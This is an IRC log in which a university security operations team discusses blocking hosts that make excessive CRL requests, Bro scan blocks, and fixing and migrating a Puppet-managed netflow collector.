2014-10-02 11:07:16	eyrich	so what jim basney wants is that any host that does over 1000 requests in a 24 hour period gets blocked
2014-10-02 11:07:29	jazoff	oh, blocked too, ok
2014-10-02 11:07:35	eyrich	but not BHR
2014-10-02 11:08:10	eyrich	what we would need is a text file generated that the CA firewalls can grab and then insert into the rules 
2014-10-02 11:09:20	soehlert	wait do they do some weird blocking stuff on their hosts?
2014-10-02 11:09:40	eyrich	?
2014-10-02 11:09:59	soehlert	they have iptables reading from a flat file to do blocking on the polos?
2014-10-02 11:10:12	eyrich	no - pfsense can do that
2014-10-02 11:10:23	soehlert	ahhh
2014-10-02 11:32:23	wardog	it's nice. I also have all of china blocked...
2014-10-02 11:32:30	wardog	for my home network.
2014-10-02 11:32:36	soehlert	racist
2014-10-02 11:34:24	jschipp	how long do we store logs?
2014-10-02 11:34:33	soehlert	depends on log type
2014-10-02 11:34:44	soehlert	but look at crontab on lowp for definitive answer
2014-10-02 11:55:21	wardog	this is redunk https://webcache.googleusercontent.com/search?q=cache:tAlecS9GGkIJ:dereklow.co
2014-10-02 12:32:04	jazoff	eyrich: so.. I can do 1000 in a 24 hour period...
2014-10-02 12:32:28	jazoff	but is that more 41/hr, or 1000 is the limit?
2014-10-02 12:34:32	jazoff	so.. literally set threshold to 1000/day or do something more like 30/hour
2014-10-02 12:51:03	jazoff	eyrich: do those http requests happen over https or http?
2014-10-02 13:01:04	jazoff	i guess most are http...
2014-10-02 13:01:19	jazoff	otherwise i'd have to key off ssl connection entries to port 443
2014-10-02 13:36:16	eyrich	they are http, 1000/24 hours would be best i think. That is what the service manager would like
2014-10-02 13:37:01	eyrich	rebooting vcenter for patches, and because it is actin gbad
2014-10-02 13:37:03	eyrich	bad
2014-10-02 13:40:56	eyrich	memory ussag eissue with java app
2014-10-02 13:42:32	jschipp	Can someone see if I left some papers on the printer from yesterday?
2014-10-02 13:42:33	jazoff	ok.. the only issue i see with 1000/24 hours is if someone is doing 100/hr it won't alert for 10 hours
2014-10-02 13:42:47	eyrich	right, let me ask
2014-10-02 13:42:50	jazoff	even though at that rate it would easily do 2x the limit
2014-10-02 13:50:00	eyrich	ok - how about >99 in 15 minutes
2014-10-02 13:50:31	eyrich	and we need the IP appedned to a file the firewalls can grab with http
2014-10-02 13:50:41	eyrich	delete the block file on the 1st of every month
2014-10-02 13:51:06	eyrich	or you can create a cleanup system that blocks them for 14 days
2014-10-02 13:54:20	eyrich	heading home to let out dogs, will work rest of day from home
2014-10-02 14:04:33	jazoff	oook, that's a lot of stuff :)
2014-10-02 14:04:38	jazoff	but I will tackle one at a time
2014-10-02 14:41:47	jschipp	Okay, the syslog remote logging doc is pretty thorough now. Proofread or make suggestions: https://wiki.ncsa.illinois.edu/display/SecOps/Syslog+Remote+Logging+Best+Practices
2014-10-02 14:43:09	 *	jschipp going for a walk
2014-10-02 14:45:31	jschipp	nvm, no walk, meeting here in 15
2014-10-02 14:47:26	soehlert	jazoff: what kinda cpu/ram does flows-sec need?
2014-10-02 14:51:31	eyrich	jazoff: yes please start with notice, I can manually block
2014-10-02 14:52:08	jazoff	soehlert: cpu not much, ram.. sometimes it helps to have as much ram as the flow size for the day is
2014-10-02 14:52:13	jazoff	which keeps the web interface speedy
2014-10-02 14:52:35	soehlert	So what are we thinking then? I have no clue how big those get
2014-10-02 14:53:13	jazoff	looks like 2G should do it. if I recall we have spare ram, so might as well throw 4 or 8 at it if we can
2014-10-02 14:53:23	soehlert	ya i was thinking 8
2014-10-02 14:55:14	jazoff	works for me
2014-10-02 14:56:14	soehlert	does it need an internal and public ip?
2014-10-02 15:09:20	jazoff	yes, i believe neteng sends to public ip
2014-10-02 15:09:33	soehlert	and we require the private?
2014-10-02 15:10:16	jazoff	eyrich: bro policy written, deploying to bro-dev
2014-10-02 15:10:27	jazoff	soehlert: hmm, do we have any boxes that are just public?
2014-10-02 15:10:37	soehlert	yup
2014-10-02 15:11:42	eyrich	jazoff: thanks
2014-10-02 15:12:16	jazoff	soehlert: it needs to mount lowp nfs, that means it should have private, right?
2014-10-02 15:12:34	soehlert	yup good enough reason for me
2014-10-02 15:12:34	soehlert	just checking
2014-10-02 15:39:10	soehlert	jazoff: you want me to put role::profile on flows-sec or do you need to do anything special with it?
2014-10-02 15:50:20	jazoff	you can do it
2014-10-02 15:50:25	jazoff	oh, actually
2014-10-02 15:50:48	jazoff	maybe don't do that
2014-10-02 15:50:51	jazoff	it would likely work
2014-10-02 15:50:59	soehlert	what is your concern?
2014-10-02 15:51:03	jazoff	but then the nfs stuff might work and it will try archiving the empty logs to lowp
2014-10-02 15:51:18	jazoff	how did you get around that for settting up the new syslog stuff?
2014-10-02 15:52:04	soehlert	i changed its environment (development and production) and then changed that stuff in hiera
2014-10-02 15:52:24	jazoff	ah
2014-10-02 15:52:34	jazoff	oh, yeah, that would work
2014-10-02 15:52:37	jazoff	looks like I already put the nfs stuff in nfsen::logarchive
2014-10-02 15:53:08	soehlert	but either way, secops user should work at 10.142.148.92
2014-10-02 15:56:12	jazoff	ok, you should be good to go to add the role/profile to that box as long as it is in development
2014-10-02 15:56:23	jazoff	will be interesting to see if everything installs automagically
2014-10-02 15:56:44	soehlert	ok its the netflows role and not the indexer right
2014-10-02 15:56:52	jazoff	correct
2014-10-02 15:56:59	jazoff	nfsen
2014-10-02 15:57:05	jazoff	oh, right
2014-10-02 15:57:12	jazoff	secapps netflow
2014-10-02 15:58:52	soehlert	here we go...
2014-10-02 16:04:54	soehlert	had to run a few times to get everything, but it looks like it grabbed all the nfsen stuff
2014-10-02 16:05:11	soehlert	its listening on port 80, but i dont see any other ports..
2014-10-02 16:05:31	jazoff	nfcapd is udp...
2014-10-02 16:05:44	soehlert	ahh duh
2014-10-02 16:07:20	soehlert	on 8888?
2014-10-02 16:07:33	jazoff	there should be samplicate and nfcapd
2014-10-02 16:07:38	jazoff	i think 8888 and 7777?
2014-10-02 16:07:44	soehlert	i see 8888 and 68
2014-10-02 16:08:22	jazoff	ah, that's samplicate
2014-10-02 16:08:25	jazoff	nfcapd should be on 9999
2014-10-02 16:08:35	soehlert	whats 68?
2014-10-02 16:08:53	soehlert	nvm
2014-10-02 16:09:04	soehlert	so nfcapd doesnt seem to have worked
2014-10-02 16:10:30	soehlert	ya it's not running
2014-10-02 16:10:33	jazoff	hmm
2014-10-02 16:10:57	jazoff	if you run puppet again, does it try to start the nfsen service?
2014-10-02 16:11:05	jazoff	there's a 
2014-10-02 16:11:06	jazoff	  service { 'nfsen':
2014-10-02 16:11:06	jazoff	    ensure => running,
2014-10-02 16:11:06	jazoff	  }
2014-10-02 16:11:15	jazoff	so it should start it or die trying :)
2014-10-02 16:11:34	soehlert	Info: Applying configuration version '1412284267'
2014-10-02 16:11:34	soehlert	Notice: Finished catalog run in 11.73 seconds
2014-10-02 16:11:42	jazoff	odd
2014-10-02 16:11:46	jazoff	there is /etc/init.d/nfsen ?
2014-10-02 16:11:50	soehlert	[root@flows-sec ~]# ps aux | grep nfcap
2014-10-02 16:11:50	soehlert	root     18431  0.0  0.0 103240   872 pts/0    S+   16:11   0:00 grep nfcap
2014-10-02 16:12:04	soehlert	ahhh
2014-10-02 16:12:06	soehlert	[root@flows-sec ~]# /etc/init.d/nfsen status
2014-10-02 16:12:06	soehlert	Configured sources do not match existing sources. Run 'nfsen reconfig' first!
2014-10-02 16:12:12	jazoff	ahh
2014-10-02 16:12:22	jazoff	does that make it work?
2014-10-02 16:13:22	soehlert	New sources to configure : netdata
2014-10-02 16:13:22	soehlert	Remove configured sources: peer2 upstream1 peer1
2014-10-02 16:13:22	soehlert	Continue? [y/n]
2014-10-02 16:13:22	soehlert	should i continue?
2014-10-02 16:13:35	jazoff	yes
2014-10-02 16:13:45	jazoff	wonder how to get that done right OOTB
2014-10-02 16:14:22	soehlert	[root@flows-sec ~]# service nfsen status
2014-10-02 16:14:22	soehlert	NfSen version: 1.3.6p1
2014-10-02 16:14:22	soehlert	NfSen status:
2014-10-02 16:14:22	soehlert	Collector for (netdata) port 9999 is not running.
2014-10-02 16:14:22	soehlert	nfsen daemon: is not running.
2014-10-02 16:14:29	soehlert	after running puppet again it still doesnt start
2014-10-02 16:14:41	jazoff	no nfsen that's a bad nfsen
2014-10-02 16:18:06	jazoff	ok, lemme see :)
2014-10-02 16:24:07	jazoff	odd, it runs
2014-10-02 16:24:08	jazoff	Debug: Executing '/sbin/service nfsen status'
2014-10-02 16:24:09	jazoff	but.. that's it
2014-10-02 16:24:21	soehlert	why status? weird..
2014-10-02 16:24:29	jazoff	oh, that's how puppet works
2014-10-02 16:24:38	soehlert	it only runs status?
2014-10-02 16:24:38	jazoff	i think status is exiting with 0 instead of 1
2014-10-02 16:24:50	soehlert	ahhh i was just thinking, it gives that big output instead of stopped/started
2014-10-02 16:25:14	jazoff	yeah, it's not a standard init script
2014-10-02 16:25:19	jazoff	ive had issues with it in the past
2014-10-02 16:25:28	jazoff	it's not really an init script, it's actually just nfsen itself
2014-10-02 16:25:35	soehlert	i see
2014-10-02 16:26:11	jazoff	i bet it works when the box reboots, but then puppet gets confused
2014-10-02 16:26:36	jazoff	i can fix via puppet though
2014-10-02 16:26:44	soehlert	how so?
2014-10-02 16:26:46	jazoff	not sure if I want to hackup nfsen
2014-10-02 16:26:49	jazoff	you can do custom init commands
2014-10-02 16:26:57	soehlert	ahh that sounds better ya
2014-10-02 16:27:05	jazoff	like
2014-10-02 16:27:05	jazoff	        status    => '/sbin/initctl status netflowindexerweb | grep "/running" 1>/dev/null 2>&1',
2014-10-02 16:27:44	soehlert	ah thats cool
2014-10-02 16:32:47	jazoff	pushing fix
2014-10-02 16:33:44	soehlert	much better
2014-10-02 16:35:20	jazoff	yay
2014-10-02 16:35:39	soehlert	so now the question, can we point stuff at both or do we just have to move it?
2014-10-02 16:35:55	jazoff	we can use samplicate to bounce the data to the other box
2014-10-02 16:36:07	jazoff	and then cutover, that's how we did it the first time
2014-10-02 16:36:19	soehlert	i hope by "we" you mean "me" :)
2014-10-02 16:36:25	jazoff	yeah
2014-10-02 16:36:33	soehlert	perfect hah
2014-10-02 16:42:34	jazoff	ah, were we goign to add a public interface?
2014-10-02 16:42:47	jazoff	not sure if I can samplicate from 141.142 to 10.142
2014-10-02 16:43:10	soehlert	yes but i wasn't going to do that until i moved it, but i guess we can steal a random one for now
2014-10-02 16:44:31	jazoff	for now?
2014-10-02 16:44:54	soehlert	well when we were ready to move it i was going to use the ip's currently in use by flows-sec
2014-10-02 16:44:54	soehlert	to avoid having to reregister
2014-10-02 16:45:01	jazoff	oooh
2014-10-02 16:45:12	jazoff	yeah, good poitn there
2014-10-02 16:49:08	eyrich	what is the default block time for a bro scan?
2014-10-02 16:50:50	jazoff	should be 5 minutes 
2014-10-02 16:51:30	jazoff	ninfo bhrhistory 173.16.37.227
2014-10-02 16:51:48	ncsabot	<14>Oct  2 16:18:16 cygnus BHR_BLOCK: IP=173.16.37.227 HOSTNAME=173-16-37-227.client.mchsi.com WHO=bro WHY="Scan::Address_Scan: 173.16.37.227 scanned at least 37 unique hosts on port 8100/tcp in 2m2s" UNTIL=1412288692 DURATION=3996
2014-10-02 16:51:49	ncsabot	<14>Oct  2 15:05:06 cygnus BHR_UNBLOCK: IP=173.16.37.227 WHO=cronjob WHY="Block Time Expired"
2014-10-02 16:51:49	ncsabot	<14>Oct  2 14:48:27 cygnus BHR_BLOCK: IP=173.16.37.227 HOSTNAME=173-16-37-227.client.mchsi.com WHO=bro WHY="Scan::Address_Scan: 173.16.37.227 scanned at least 37 unique hosts on port 8100/tcp in 4m43s" UNTIL=1412280207 DURATION=900
2014-10-02 16:52:21	eyrich	ya I see he repeat offedned
2014-10-02 16:52:35	eyrich	looks 15 first time
2014-10-02 16:52:42	jazoff	oh, right, sorry, yeah 15 :)
2014-10-02 16:52:45	eyrich	which is what i xpected
2014-10-02 16:52:50	eyrich	i will email him back
2014-10-02 16:53:49	jazoff	added him to the bhr whitelist in the portal
2014-10-02 16:54:00	jazoff	bro will sync up with that shortly so he should not get blocked again(by bro)
2014-10-02 16:54:48	eyrich	ok - I was going to tell him we wont do that, as it looks like a dynamic assigned cable IP
2014-10-02 16:55:04	eyrich	did he scan across subnets?
2014-10-02 16:55:35	jazoff	oh
2014-10-02 16:55:54	eyrich	for now lets leave white listed, we can discuss with warren
2014-10-02 16:55:57	jazoff	the 'scan across subnets' is implemented for the ssh scanning policy i wrote, but not for the bro port scanner
2014-10-02 16:56:03	eyrich	ok
2014-10-02 16:59:42	jazoff	also, I forwarded you the crl notices
2014-10-02 17:00:05	jazoff	ninfo bro_notice 81.180.86.124
2014-10-02 17:00:08	eyrich	i saw thanks, i will work on blocking those in the morning.
2014-10-02 17:00:08	ncsabot	Empty Result
2014-10-02 17:00:13	jazoff	you lieee
2014-10-02 17:00:16	jazoff	ninfo bro_notice 81.180.86.124
2014-10-02 17:00:17	ncsabot	Empty Result
2014-10-02 17:01:13	jazoff	oh, no it doesn't :)
2014-10-02 17:01:24	jazoff	the policy is only in dev and dev doesn't send to splunk, prod does
2014-10-02 17:01:57	jazoff	CRL::ExcessiveRequests      81.180.86.124 has made more than 192.000000 CRL requests
2014-10-02 17:05:05	jazoff	looking into adding SumStats::SAMPLE so the notice can include example urls
2014-10-02 17:12:19	eyrich	cool, thanks do we need the .000000
2014-10-02 17:12:21	eyrich	?
2014-10-02 17:12:21	eyrich	:)
2014-10-02 17:19:28	jazoff	oh, lol
2014-10-02 17:19:43	jazoff	it happened to wrap at that exact point on my monitor, did not notice
2014-10-02 17:21:07	eyrich	i dont think round robin dns is going to do what they think it will
2014-10-02 17:23:49	jazoff	ok, new script deploying to bro-dev
2014-10-02 17:23:56	jazoff	should format better and include 5 urls in the notice email
2014-10-02 17:24:28	eyrich	thanks
2014-10-02 17:24:55	jazoff	oh, bro would have only detected it as a port scan if most of the connections failed
2014-10-02 17:25:08	jazoff	so if he connected to a number of systems that mostly did not accept the connection, that would do it
2014-10-02 17:25:10	eyrich	right, that too
2014-10-02 17:25:41	jazoff	ok, food time
2014-10-02 17:26:22	eyrich	later
2014-10-03 07:51:25	eyrich	jazoff: can you send me the notices for the excessive crl download from this morning
2014-10-03 07:53:53	jazoff	yes
2014-10-03 07:55:27	jazoff	there are 61 of them
2014-10-03 07:55:29	jazoff	how do you want them?
2014-10-03 07:55:41	eyrich	email or file
2014-10-03 08:00:55	jazoff	ok, sent mail from bro-dev
2014-10-03 08:01:22	jazoff	soon as the next dev->prod merge in puppet it'll be running on supercell and in splunk
2014-10-03 08:01:35	eyrich	ok thanks
2014-10-03 08:05:33	jazoff	quite a bit more than I expected
2014-10-03 08:05:54	jazoff	some appear to be clusters which makes sense.. 100+ boxes all hitting the same cert behind nat
2014-10-03 08:06:02	eyrich	yes
2014-10-03 08:06:17	eyrich	althought best practice for clusters should be to proxy their crl requests
2014-10-03 08:07:23	eyrich	or single download to shared local storage
2014-10-03 08:10:11	jazoff	oh, i dunno if that mail sent out
2014-10-03 08:10:18	jazoff	[root@bro-dev log]# find /var/spool/clientmqueue/|wc -l
2014-10-03 08:10:19	jazoff	2025
2014-10-03 08:10:20	jazoff	uhhhh
2014-10-03 08:10:20	eyrich	i got it
2014-10-03 08:10:22	jazoff	oh
2014-10-03 08:13:58	jazoff	did you get another one with totals?
2014-10-03 08:14:15	eyrich	no
2014-10-03 08:16:34	jazoff	eek... sun just turned off outside and it's pouring and thundering
2014-10-03 08:17:26	eyrich	only email from dev box i got looks liek this:
2014-10-03 08:17:28	eyrich	2014-10-03T00:01:40-0500	155.210.135.183 has made more than 99 CRL requests in 15.0 mins 2014-10-03T00:01:57-0500	155.210.135.198 has made more than 106 CRL requests in 15.0 mins 2014-10-03T00:02:15-0500	194.254.225.174 has made more than 99 CRL requests in 15.0 mins 2014-10-03T00:10:30-0500	193.205.76.68 has made more than 164 CRL requests in 15.0 mins 2014-10-03T00:13:46-0500	161.53.133.13 has made more than 99 CRL requests in 15.0 mins
2014-10-03 08:17:49	eyrich	except with proper formatting
2014-10-03 08:18:55	jazoff	yeah, wonder why the other one isn't going though
2014-10-03 08:19:14	jazoff	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20source%3D*http_inbound*%20%28crl.cilogon.org%20OR%20crl.ncsa.illinois.edu%29%20|%20top%20limit%3D1000%20id_orig_h&earliest=-1d%40d&latest=%40d
2014-10-03 08:19:18	jazoff	that will work though
2014-10-03 08:19:35	jazoff	149.156.9.9 seems to be the worst offender by a large margin
2014-10-03 08:22:10	jazoff	been messing with the new BHR system.. seems to have most of the needed features
2014-10-03 08:22:23	jazoff	still need to add the block scaling, but it is working well locally
2014-10-03 08:22:28	eyrich	cool
2014-10-03 08:22:42	jazoff	one thing I need to think about is the block time extension thing...
2014-10-03 08:22:51	jazoff	small amount of code, but I had it working at UA..
2014-10-03 08:23:06	jazoff	basically, bro may block something for a day, but the IP may be in a feed that gets blocked for a week
2014-10-03 08:23:21	jazoff	so bro blocks it for a day, then the feed cronjob runs, and bumps up the time to a week
2014-10-03 08:23:45	jazoff	but then it shouldn't work the other way, if you block something for a month, and then it shows up in the feed, it should stay as a month and not decrease to a week
2014-10-03 08:24:09	eyrich	right
2014-10-03 08:24:32	jazoff	not really complicated, but lots of corner cases
2014-10-03 08:25:54	jazoff	i have most of the code written for feed based blockes
2014-10-03 08:26:14	jazoff	basically a class that you implement a 'get records' function and it handles adding/removing ips as the feed changes
2014-10-03 10:08:44	wardog	jazoff: you'
2014-10-03 10:08:54	wardog	re still able to make the 2pm meeting today, right?
2014-10-03 10:14:30	jazoff	oh, yes
2014-10-03 10:14:38	jazoff	was an invite ever sent out?
2014-10-03 10:14:50	wardog	yep, from Adam
2014-10-03 10:15:01	jazoff	oh, there it is
2014-10-03 10:15:06	jazoff	stupid mac cal was on last week still
2014-10-03 10:18:20	wardog	That's ok. I had my Outlook calendar narrowed down to a 5 day work calendar and assumed Thursday was Friday.
2014-10-03 10:49:16	eyrich	i need to see all the traffic from this IP range 141.142.164.0/22 for the month of Sept, whats our best/fastest tool for that. 
2014-10-03 10:51:58	wardog	lowp
2014-10-03 10:52:01	wardog	Or bro logs
2014-10-03 10:52:05	wardog	conn.log
2014-10-03 10:52:24	eyrich	not flows?
2014-10-03 10:52:45	wardog	conn logs are essentially flows
2014-10-03 10:52:57	eyrich	but only from places we tap
2014-10-03 10:55:34	jazoff	eyrich: https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single
2014-10-03 10:55:51	jazoff	oh actually, that doesn't let you put in cidr... 
2014-10-03 10:56:04	jazoff	http://lowp.ncsa.illinois.edu:8000/ will work though
2014-10-03 10:56:22	eyrich	what password for portal?
2014-10-03 10:56:39	jazoff	AD.. but just go direcrly to the netflow indexer link
2014-10-03 10:56:46	jazoff	i need to fix the nfi stats plugin to accept a cidr
2014-10-03 10:56:53	eyrich	i did and it asked for a password
2014-10-03 10:57:01	eyrich	when i put in am IP
2014-10-03 10:57:15	jazoff	no.. go to http://lowp.ncsa.illinois.edu
2014-10-03 10:57:20	jazoff	er
2014-10-03 10:57:23	jazoff	http://lowp.ncsa.illinois.edu:8000/
2014-10-03 10:57:30	eyrich	ya thats not working either
2014-10-03 10:57:49	eyrich	what are the iptables rule for port 8000 public on lowp?
2014-10-03 10:58:07	jazoff	good question
2014-10-03 10:58:15	jazoff	lemme see if it is not using the helper
2014-10-03 10:58:32	jazoff	it is...
2014-10-03 10:58:32	jazoff	    fw::helpers::security_bastion_allow { '200 netflow-indexer-web':
2014-10-03 10:58:32	jazoff	      dport  => '8000',
2014-10-03 10:58:32	jazoff	    }
2014-10-03 10:58:52	eyrich	is sects01 part of the bastion list?
2014-10-03 10:59:07	jazoff	yeah.. it should be :)
2014-10-03 10:59:12	jazoff	that's why I made that helper :)
2014-10-03 10:59:55	jazoff	intersting, not showing up on lowp though
2014-10-03 11:00:23	jazoff	very odd
2014-10-03 11:00:59	jazoff	oh, puppet is broked on lowp
2014-10-03 11:01:05	jazoff	did we never switch it off of squall?
2014-10-03 11:01:22	jazoff	we did not
2014-10-03 11:16:54	jazoff	grrr
2014-10-03 11:29:18	wardog	eyrich: you have to tunnel through fog
2014-10-03 11:29:25	eyrich	no
2014-10-03 11:29:27	eyrich	:)
2014-10-03 11:30:01	wardog	sects may work. I don't remember.
2014-10-03 11:30:18	jazoff	it should.. puppet just has not been running on lowp for who knows how long
2014-10-03 11:30:24	eyrich	it doesnt because iptables on lowp is not right
2014-10-03 11:30:38	wardog	I can get to it fine
2014-10-03 11:30:47	jazoff	yes.. because it works from fog and dew
2014-10-03 11:30:53	jazoff	but it never got the update to allow from sects
2014-10-03 11:31:01	jazoff	puppet fixed now, applying a large backlog of updates
2014-10-03 11:31:09	jazoff	hopefully lowp does not break
2014-10-03 11:31:41	wardog	ah
2014-10-03 11:36:48	jazoff	eyrich: Oct  3 11:35:00 lowp yum[30718]: Installed: kmod-vmware-tools-vmxnet-2.0.14.0-2.6.32.71.el6.x86_64.5.el6.x86_64
2014-10-03 11:36:52	jazoff	Oct  3 11:35:07 lowp yum[30718]: Installed: vmware-tools-vmci-common-9.0.12-5.el6.x86_64
2014-10-03 11:36:59	jazoff	lowp is a vm?
2014-10-03 11:37:04	eyrich	no
2014-10-03 11:37:10	jazoff	oh, that wont harm anythign will it?
2014-10-03 11:37:22	eyrich	idk - never tested
2014-10-03 11:38:09	jazoff	eh
2014-10-03 11:38:23	jazoff	lowp just got kinda slow
2014-10-03 11:38:46	jazoff	probably crashplans fault though
2014-10-03 11:54:43	jazoff	hmmm
2014-10-03 11:55:05	jazoff	looks like lowp also used to be role:profile of log:archive but got changed to secapps:netflow-indexer
2014-10-03 11:58:54	jazoff	ok.. moved the yaml stuff over for now, but it should probably be changed back
2014-10-03 11:59:34	wardog	also, a full dump of a whole month for a /22 could take a while.
2014-10-03 12:00:27	jazoff	oh, yeah, I just noticed that, that would be faster using nfdump probably
2014-10-03 12:00:43	jazoff	lemme get that going on the flows box
2014-10-03 12:02:10	jazoff	definitely a yak shaving kind of day 
2014-10-03 12:02:57	wardog	You have to start somewhere
2014-10-03 12:05:04	jazoff	Oct  3 12:04:27 lowp puppet-agent[1622]: (/Firewall[200 netflow-indexer-web - sects01]/ensure) created
2014-10-03 12:05:08	jazoff	SUCCESS
2014-10-03 12:05:20	jazoff	now that we no longer need it!
2014-10-03 12:06:56	jazoff	up to 9/9 and the gzipped log output for that net is 62M already
2014-10-03 12:07:04	jazoff	so the full file is going to be around 300M
2014-10-03 12:07:22	jazoff	while that runs I am goign to make a late lunch :)
2014-10-03 12:07:45	wardog	You need a lunch alarm
2014-10-03 12:07:55	jazoff	yeah, something always seems to come up
2014-10-03 12:08:02	jazoff	i have one for the dog :)
2014-10-03 13:00:43	jazoff	ok, bhr block time autoscaling implemented in new sytem
2014-10-03 13:01:02	jazoff	same math, just need to write lots and lots of tests now
2014-10-03 13:39:47	<--	wardog (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has quit (Quit: leaving)
2014-10-03 13:41:12	-->	wraquel (wraquel@hidden-EA35C84E.ncsa.illinois.edu) has joined #security
2014-10-03 14:28:04	jazoff	eyrich: oh, that command finished
2014-10-03 14:28:07	jazoff	275M    /home/jazoff/net_141.142.164.0_22.txt.gz
2014-10-03 14:28:44	jazoff	20,348,086 lines
2014-10-06 09:27:59	soehlert	crap, ya vmware_tools should be on the virtual yaml not common..
2014-10-06 10:12:06	jazoff	:)
2014-10-06 11:45:19	jschipp	can someone add a readme file to the bwbh_user_check repo? basic usage and how to install the jira modules
2014-10-06 12:02:20	soehlert	I can't remember having to install modules. I think you just needed to be on a certain python release
2014-10-06 12:02:28	soehlert	and the usage is ./check.py
2014-10-06 12:06:27	jschipp	from jira.client import JIRA
2014-10-06 12:06:35	soehlert	and i think that's in python 2.7.5
2014-10-06 12:06:42	soehlert	i dont think i ever had to download anything special
2014-10-06 12:06:46	soehlert	besides updated python
2014-10-06 12:09:46	soehlert	im double checking though
2014-10-06 12:09:48	jschipp	doesn't seem to be, jira seems a bit specific to be included in the base
2014-10-06 12:09:49	jschipp	$ python2.7 -V
2014-10-06 12:09:49	jschipp	Python 2.7.5
2014-10-06 12:10:00	jschipp	$ python2.7 check.py 
2014-10-06 12:10:00	jschipp	Traceback (most recent call last):
2014-10-06 12:10:00	jschipp	  File "check.py", line 10, in <module>
2014-10-06 12:10:00	jschipp	    from jira.client import JIRA
2014-10-06 12:10:01	jschipp	ImportError: No module named jira.client
2014-10-06 12:10:33	soehlert	do you have easy_install or pip? just try and install jir
2014-10-06 12:10:35	soehlert	a
2014-10-06 12:10:39	soehlert	maybe thats what i did
2014-10-06 12:14:02	jschipp	i'll look into it later then
2014-10-06 12:14:26	soehlert	don't have easy_install or pip?
2014-10-06 12:14:41	jschipp	I have easy_install but it's borked
2014-10-06 12:14:50	soehlert	ah
2014-10-06 12:36:10	jazoff	yeah, pip
2014-10-06 12:36:16	jazoff	generally you want to make a virtual environment
2014-10-06 12:36:20	jazoff	virtualenv foo
2014-10-06 12:36:33	jazoff	. foo/bin/activate
2014-10-06 12:36:36	jazoff	pip install jira
2014-10-06 12:36:43	jazoff	then it will work
2014-10-06 12:37:04	jazoff	it's possible to kind of bundle the things together into a 'binary' but not alwas worth it
2014-10-06 13:25:17	jschipp	any RSS reader recommendations on OSX?
2014-10-06 13:25:34	soehlert	i think the one i use is feedly
2014-10-06 13:26:43	jschipp	I switched to that when Google's service went away. Unfortunately, I didn't stick to it. May have to try it again
2014-10-06 13:26:59	soehlert	not saying its great, more that its best of a bad situation from what i saw
2014-10-06 13:29:33	jazoff	i've heard good thigns about TTRSS, but that is a server
2014-10-06 13:38:08	soehlert	jazoff: hows the new flows machine looking?
2014-10-06 14:02:12	eyrich	i use feedly
2014-10-06 14:03:19	jazoff	soehlert: what was the IP again?
2014-10-06 14:03:33	soehlert	92 or 93 one sec
2014-10-06 14:04:09	soehlert	10.142.148.92
2014-10-06 14:04:39	jazoff	ah, kerberos wont work right?
2014-10-06 14:06:57	jazoff	box looks good.. need to think about how to work the switchover though
2014-10-06 14:07:03	jazoff	since we aren't doing it the same way we did before
2014-10-06 14:08:32	soehlert	right. and it should be the same as before..
2014-10-06 14:08:41	soehlert	i switched out for the same ips last time
2014-10-06 14:10:48	jazoff	well, before we had neteng change the destination address
2014-10-06 14:11:02	soehlert	oh thats right
2014-10-06 14:12:55	jazoff	so this is the same, but different :)
2014-10-06 14:13:22	soehlert	what is your concern with this one?
2014-10-06 14:13:40	jazoff	not so much a concern, just need to work out the steps
2014-10-06 14:14:17	jazoff	i think just need to rsync the current data from old->new server and then swap the ips real quick
2014-10-06 14:14:32	soehlert	makes sense to me
2014-10-06 14:14:40	jazoff	then disable the old prod server and promote the new one to prod(puppet conf)
2014-10-06 14:14:44	jazoff	which will turn on the rsync archive cron job
2014-10-06 14:14:57	soehlert	cool
2014-10-06 14:15:16	soehlert	so do you want to swap ips? so the old one is still accessible? or does that not matter?
2014-10-06 14:15:37	jazoff	hmm, we can do that I suppose and use samplicate to send to the old server too
2014-10-06 14:15:41	jazoff	but that gets tricky
2014-10-06 14:16:19	soehlert	no i dont want to
2014-10-06 14:16:19	soehlert	just asking if you need the old one accesible or not
2014-10-06 14:16:19	jazoff	lemme at least start the rsync process
2014-10-06 14:16:29	jazoff	we shouldn't
2014-10-06 14:16:39	jazoff	except to swap back if it looks like the new one is not working
2014-10-06 14:16:54	soehlert	hmm well shit, then i guess i will have to since it's physical and im not at pcf
2014-10-06 14:17:14	jazoff	oh, trickier :)
2014-10-06 14:17:27	jazoff	well is there a third ip you can move the current server to?
2014-10-06 14:17:30	jazoff	current -> temp
2014-10-06 14:17:34	jazoff	new -> current
2014-10-06 14:17:39	soehlert	so i'll keep up its internal address 
2014-10-06 14:17:39	soehlert	and ya i can do that
2014-10-06 14:17:45	jazoff	ok
2014-10-06 14:17:51	jazoff	do we have to do anything on lowp?
2014-10-06 14:18:02	jazoff	i guess now...
2014-10-06 14:18:03	jazoff	not
2014-10-06 14:18:03	jazoff	/data/nfdump       hurricane.ncsa.illinois.edu(sync,rw) gris.ncsa.uiuc.edu(sync,rw) flows-sec.ncsa.illinois.edu(sync,rw)
2014-10-06 14:18:09	jazoff	since we are going to still be using flows-sec right?
2014-10-06 14:18:28	soehlert	nope it's done via hostname
2014-10-06 14:18:32	soehlert	ya exactly
2014-10-06 14:18:54	jazoff	grrr, i can't ssh from old box to flows-sec
2014-10-06 14:19:11	soehlert	nope not by default. tcpwrappers and iptables..
2014-10-06 14:19:19	jazoff	hmmm
2014-10-06 14:19:23	jazoff	how did I do this last time? :)
2014-10-06 14:19:38	soehlert	i think you made a temporary exception
2014-10-06 14:19:58	jazoff	yeah, this problem seems familiar
2014-10-06 14:20:27	jazoff	yeah, tcpwrappers is fine, just need an iptables rule
2014-10-06 14:21:12	soehlert	oh right i changed tcpwrapers to be broadened to our subnets
2014-10-06 14:23:58	jazoff	ok, rsyncing
2014-10-06 14:27:36	jazoff	ok, will check on that in a bit
2014-10-06 14:27:45	soehlert	cool
2014-10-06 14:30:51	jazoff	doh!
2014-10-06 14:30:54	jazoff	rsync: write failed on "/usr/local/nfsen/profiles-data/live/netdata/2014/08/18/nfcapd.201408180935": No space left on device (28)
2014-10-06 14:31:10	soehlert	grr
2014-10-06 14:31:18	soehlert	i presume on the new one
2014-10-06 14:31:36	soehlert	how much space you think you need?
2014-10-06 14:35:22	jazoff	umm, however much the old one has :)
2014-10-06 14:38:03	soehlert	hrmm we dont have that much available as of now. i suppose i can mount a new harddrive. or i can just start over and give it's normal hard drive more space. which would you prefer?
2014-10-06 14:39:41	jazoff	it can't be grown in esx?
2014-10-06 14:39:49	soehlert	idk never tried that. i can look
